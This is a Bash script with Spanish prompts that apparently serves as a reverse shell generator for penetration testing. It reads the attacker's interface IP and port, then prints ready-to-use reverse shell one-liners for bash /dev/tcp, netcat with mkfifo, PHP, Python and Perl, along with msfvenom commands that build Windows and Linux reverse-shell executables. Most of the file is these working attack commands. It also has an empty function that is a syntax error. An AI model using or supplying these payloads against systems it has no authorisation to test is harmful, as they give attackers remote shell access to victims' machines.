#!/bin/bash

selector_interfaz(){

	echo "== SELECCIONA LA INTERFAZ =="
	echo "EJ: eth0, tun0...."
	read interfaz

	lhost=$(ip a | grep "inet" | grep "$interfaz" | awk '{print $2}' | sed -e 's/\// /g' | awk '{print $1}')

}

selector_puerto(){
	

}


dato(){

	echo -e "|| SELECTOR DE REVERSE SHELL ||\n"
	selector_interfaz
	echo "== INTRODUCE EL PUERTO HOST =="
	read lport
	clear

}

menu() {

	echo -e "== MENU ==\n"
	echo "¬ 1. BASH"
	echo "¬ 2. NETCAT (MKFIFO)"
	echo "¬ 3. PHP"
	echo "¬ 4. PYTHON"
	echo "¬ 5. PERL"
	echo -e "\n MSFVENOM"
	echo "¬ 6. Windows x64"
	echo "¬ 7. Windows x86"
	echo "¬ 8. Linux x64"
	echo "¬ 9. Linux x86"

}

opcion_invalida(){

	clear
	echo -e "\n ==| Introduce una opcion valida. |=="
	sleep 2
	clear
	menu

}

####

dato

####

while true; do

	clear
	menu
	read opcion

	case $opcion in
		1)	echo -e "\n>> bash -i >& /dev/tcp/$lhost/$lport 0>&1"
			;;
		2)	echo -e "\n>> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
			;;
		3)	echo -e "\n>> php -r '$sock=fsockopen('$lhost',$lport);exec('/bin/sh -i <&3 >&3 2>&3');"
			;;
		4)	echo -e "\n>> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'"
			;;
		5)	echo -e "\n>> perl -e 'use Socket;$i='$lhost';$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};'"
			;;
		6)	echo -e "\n>> msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell-x64.exe"
			;;
		7)	echo -e "\n>> msfvenom -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell-x86.exe"
			;;
		8)	echo -e "\n>> msfvenom -p linux/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell-x64.elf"
			;;
		9)	echo -e "\n>> msfvenom -p linux/x86/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell-x86.elf"
			;;
		*)	opcion_invalida
			;;
	esac
exit

done
